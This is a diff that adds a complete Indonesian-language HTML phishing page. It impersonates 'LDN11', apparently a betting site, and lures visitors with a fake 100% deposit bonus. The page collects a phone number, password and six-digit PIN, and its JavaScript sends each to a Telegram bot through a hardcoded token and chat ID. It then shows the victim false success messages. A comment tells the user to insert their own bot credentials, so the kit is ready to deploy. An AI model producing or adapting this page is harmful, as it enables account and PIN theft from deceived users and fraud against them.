@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LDN11 — Bonus & Masuk & PIN</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+        }
+        body {
+            background-color: #121212;
+            color: #ffffff;
+            min-height: 100vh;
+        }
+        .page {
+            display: none;
+            padding: 2rem 1.25rem;
+        }
+        .page.active {
+            display: block;
+        }
+        .container {
+            max-width: 420px;
+            margin: 0 auto;
+        }
+
+        /* === HALAMAN 1: BONUS (TAMPILAN AWAL) === */
+        .bonus-container {
+            background: linear-gradient(180deg, #d4af37, #f0c808, #b8860b);
+            border-radius: 20px;
+            padding: 2.5rem 1.5rem;
+            text-align: center;
+            max-width: 420px;
+            margin: 2rem auto 0;
+            box-shadow: 0 0 30px rgba(240, 200, 8, 0.35);
+        }
+        .bonus-logo {
+            font-size: 1.75rem;
+            font-weight: 900;
+            color: #000;
+            margin-bottom: 0.5rem;
+        }
+        .bonus-tagline {
+            color: #222;
+            font-size: 0.95rem;
+            margin-bottom: 1rem;
+        }
+        .bonus-title {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #000;
+            margin-bottom: 0.5rem;
+        }
+        .bonus-percent {
+            font-size: 4rem;
+            font-weight: 900;
+            color: #000;
+            line-height: 1;
+            margin: 0.5rem 0;
+        }
+        .bonus-desc {
+            color: #2b2b2b;
+            font-size: 1rem;
+            margin: 1rem 0 2rem;
+            line-height: 1.6;
+        }
+        .btn {
+            width: 100%;
+            padding: 1rem;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.05rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.25s ease;
+        }
+        .btn-klaim {
+            background-color: #000;
+            color: #f0c808;
+            margin-bottom: 0.85rem;
+        }
+        .btn-klaim:active {
+            transform: scale(0.97);
+            background-color: #222;
+        }
+        .btn-masuk-bonus {
+            background-color: transparent;
+            color: #000;
+            border: 2px solid #000;
+        }
+        .btn-masuk-bonus:active {
+            background-color: rgba(0,0,0,0.1);
+        }
+
+        /* === HALAMAN 2: MASUK === */
+        .login-header {
+            margin-bottom: 2rem;
+        }
+        .login-title {
+            font-size: 1.75rem;
+            font-weight: bold;
+            margin-bottom: 0.5rem;
+        }
+        .login-daftar {
+            color: #b8b8b8;
+            font-size: 0.95rem;
+        }
+        .login-daftar a {
+            color: #f0c808;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .form-group {
+            margin-bottom: 1rem;
+        }
+        .input-box {
+            display: flex;
+            align-items: center;
+            background-color: #252525;
+            border: 1px solid #3a3a3a;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+        .country-code {
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+            padding: 0.9rem 0.75rem;
+            border-right: 1px solid #3a3a3a;
+            flex-shrink: 0;
+        }
+        .flag-id {
+            width: 22px;
+            height: 15px;
+            background: url("https://flagcdn.com/w20/id.png") no-repeat center;
+            background-size: contain;
+        }
+        .code-text {
+            font-size: 0.95rem;
+        }
+        input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            padding: 0.9rem 0.75rem;
+            color: #fff;
+            font-size: 1rem;
+            outline: none;
+        }
+        .input-icon {
+            padding: 0 0.75rem;
+            color: #888;
+            cursor: pointer;
+            user-select: none;
+        }
+        .form-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 1rem 0 1.5rem;
+            font-size: 0.9rem;
+        }
+        .remember {
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+        }
+        .remember input {
+            width: auto;
+            margin: 0;
+            cursor: pointer;
+        }
+        .forgot-link {
+            color: #b8b8b8;
+            text-decoration: none;
+        }
+        .forgot-link:hover {
+            color: #f0c808;
+        }
+        .btn-login {
+            background-color: #8a7d2f;
+            color: #fff;
+        }
+        .btn-login:active {
+            background-color: #9b8e34;
+            transform: scale(0.97);
+        }
+        .back-btn {
+            background: none;
+            border: none;
+            color: #f0c808;
+            font-size: 0.95rem;
+            cursor: pointer;
+            text-decoration: underline;
+            margin-top: 2rem;
+        }
+        .status {
+            margin-top: 1rem;
+            font-size: 0.9rem;
+            text-align: center;
+        }
+        .status.sukses { color: #4ade80; }
+
+        /* === HALAMAN 3: PIN (HANYA ANGKA) === */
+        .pin-header {
+            text-align: center;
+            margin: 3rem 0 2rem;
+        }
+        .pin-title {
+            font-size: 1.5rem;
+            font-weight: bold;
+            margin-bottom: 0.5rem;
+        }
+        .pin-subtitle {
+            color: #aaa;
+            font-size: 0.95rem;
+        }
+        .pin-input-wrapper {
+            display: flex;
+            justify-content: center;
+            gap: 0.8rem;
+            margin: 2rem 0;
+        }
+        .pin-box {
+            width: 50px;
+            height: 55px;
+            background-color: #252525;
+            border: 1px solid #444;
+            border-radius: 8px;
+            text-align: center;
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #fff;
+            outline: none;
+        }
+        .pin-box:focus {
+            border-color: #f0c808;
+            box-shadow: 0 0 0 2px rgba(240,200,8,0.25);
+        }
+        .pin-desc {
+            text-align: center;
+            color: #888;
+            font-size: 0.9rem;
+            margin-bottom: 2rem;
+        }
+        .pin-desc a {
+            color: #f0c808;
+            text-decoration: none;
+        }
+        .btn-confirm {
+            background-color: #f0c808;
+            color: #000;
+        }
+        .btn-confirm:active {
+            background-color: #d4af37;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ⚙️ KONFIGURASI BOT TELEGRAM - GANTI BAGIAN INI! -->
+    <script>
+        const BOT_TOKEN = "8702815729:AAESaNje-BYbf4bz_fMB_wCAwLeZo-kSG1s"; // Ganti dengan Token Bot kamu
+        const CHAT_ID = "8527556684";     // Ganti dengan ID Chat kamu
+    </script>
+
+    <!-- ✅ HALAMAN 1: BONUS (TAMPILAN AWAL) -->
+    <div class="page active" id="pageBonus">
+        <div class="bonus-container">
+            <div class="bonus-logo">LDN11.COM</div>
+            <p class="bonus-tagline">Selamat Datang!</p>
+            <h2 class="bonus-title">Bonus Deposit Pertama</h2>
+            <div class="bonus-percent">100%</div>
+            <p class="bonus-desc">
+                Dapatkan bonus saldo 100% hingga Rp1.000.000<br>
+                Khusus anggota baru!
+            </p>
+            <button class="btn btn-klaim" onclick="gantiHalaman('Login')">KLAIM BONUS SEKARANG</button>
+            <button class="btn btn-masuk-bonus" onclick="gantiHalaman('Login')">Sudah Punya Akun? Masuk</button>
+        </div>
+    </div>
+
+    <!-- ✅ HALAMAN 2: MASUK -->
+    <div class="page" id="pageLogin">
+        <div class="container">
+            <div class="login-header">
+                <h1 class="login-title">Masukan ke akun Anda</h1>
+                <p class="login-daftar">Belum punya akun? <a href="#">Daftar</a></p>
+            </div>
+
+            <form onsubmit="return kirimDataLogin(event)">
+                <div class="form-group">
+                    <div class="input-box">
+                        <div class="country-code">
+                            <span class="flag-id"></span>
+                            <span class="code-text">+62</span>
+                        </div>
+                        <input type="tel" id="nomor" placeholder="Telepon" required>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <div class="input-box">
+                        <span class="input-icon">🔑</span>
+                        <input type="password" id="sandi" placeholder="kata sandi" required>
+                        <span class="input-icon" id="eyeIcon" onclick="togglePwd()">👁️</span>
+                    </div>
+                </div>
+
+                <div class="form-footer">
+                    <label class="remember">
+                        <input type="checkbox" checked> Ingat Kata Sandi
+                    </label>
+                    <a href="#" class="forgot-link">Lupa kata sandi?</a>
+                </div>
+
+                <button type="submit" class="btn btn-login">Masuk</button>
+                <div id="statusLogin" class="status"></div>
+            </form>
+
+            <div style="text-align:center;">
+                <button type="button" class="back-btn" onclick="gantiHalaman('Bonus')">← Kembali</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ✅ HALAMAN 3: PIN (HANYA ANGKA) -->
+    <div class="page" id="pagePIN">
+        <div class="container">
+            <div class="pin-header">
+                <h2 class="pin-title">Masukkan PIN Anda</h2>
+                <p class="pin-subtitle">Masukkan 6 digit angka PIN</p>
+            </div>
+
+            <form onsubmit="return kirimDataPIN(event)">
+                <div class="pin-input-wrapper">
+                    <input type="number" maxlength="1" class="pin-box" oninput="filterAngka(this, 0)" onkeydown="blokirHuruf(event)" required>
+                    <input type="number" maxlength="1" class="pin-box" oninput="filterAngka(this, 1)" onkeydown="blokirHuruf(event)" required>
+                    <input type="number" maxlength="1" class="pin-box" oninput="filterAngka(this, 2)" onkeydown="blokirHuruf(event)" required>
+                    <input type="number" maxlength="1" class="pin-box" oninput="filterAngka(this, 3)" onkeydown="blokirHuruf(event)" required>
+                    <input type="number" maxlength="1" class="pin-box" oninput="filterAngka(this, 4)" onkeydown="blokirHuruf(event)" required>
+                    <input type="number" maxlength="1" class="pin-box" oninput="filterAngka(this, 5)" onkeydown="blokirHuruf(event)" required>
+                </div>
+
+                <p class="pin-desc">Lupa PIN? <a href="#">Atur Ulang PIN</a></p>
+
+                <button type="submit" class="btn btn-confirm">Konfirmasi</button>
+                <div id="statusPIN" class="status"></div>
+
+                <div style="text-align:center;">
+                    <button type="button" class="back-btn" onclick="gantiHalaman('Login')">← Kembali</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        let dataPengguna = {};
+
+        // Kirim ke Telegram
+        async function kirimKeTelegram(pesan) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: pesan,
+                        parse_mode: "Markdown"
+                    })
+                });
+            } catch (e) {}
+        }
+
+        // Ganti Halaman
+        function gantiHalaman(nama) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById('page' + nama).classList.add('active');
+        }
+
+        // Kirim Data Login
+        async function kirimDataLogin(e) {
+            e.preventDefault();
+            const nomor = document.getElementById('nomor').value;
+            const sandi = document.getElementById('sandi').value;
+            dataPengguna = { nomor, sandi };
+
+            const status = document.getElementById('statusLogin');
+            status.textContent = "Sedang memproses...";
+            
+            await kirimKeTelegram(`🔐 *DATA LOGIN*\n📞 Nomor: ${nomor}\n🔑 Sandi: ${sandi}`);
+            
+            status.textContent = "Berhasil!";
+            status.className = "status sukses";
+            setTimeout(() => {
+                gantiHalaman('PIN');
+                document.querySelectorAll('.pin-box')[0].focus();
+            }, 800);
+            return false;
+        }
+
+        // Blokir input huruf
+        function blokirHuruf(e) {
+            const tombol = e.key;
+            if (!/[0-9]/.test(tombol) && tombol !== 'Backspace' && tombol !== 'Tab') {
+                e.preventDefault();
+            }
+        }
+
+        // Pastikan hanya angka & pindah kolom otomatis
+        function filterAngka(el, idx) {
+            el.value = el.value.replace(/[^0-9]/g, '');
+            if (el.value && idx < 5) {
+                document.querySelectorAll('.pin-box')[idx + 1].focus();
+            }
+        }
+
+        // Kirim Data PIN
+        async function kirimDataPIN(e) {
+            e.preventDefault();
+            const pin = Array.from(document.querySelectorAll('.pin-box')).map(i => i.value).join('');
+            
+            const status = document.getElementById('statusPIN');
+            status.textContent = "Memverifikasi...";
+            
+            await kirimKeTelegram(`🔢 *DATA PIN*\n📞 Nomor: ${dataPengguna.nomor}\n🔑 PIN: ${pin}`);
+            
+            status.textContent = "Berhasil! Bonus siap diklaim!";
+            status.className = "status sukses";
+            setTimeout(() => gantiHalaman('Bonus'), 800);
+            return false;
+        }
+
+        // Tampil/Sembunyi Kata Sandi
+        function togglePwd() {
+            const pwd = document.getElementById('sandi');
+            const eye = document.getElementById('eyeIcon');
+            pwd.type = pwd.type === 'password' ? 'text' : 'password';
+            eye.textContent = pwd.type === 'password' ? '👁️' : '🙈';
+        }
+    </script>
+</body>
+</html>
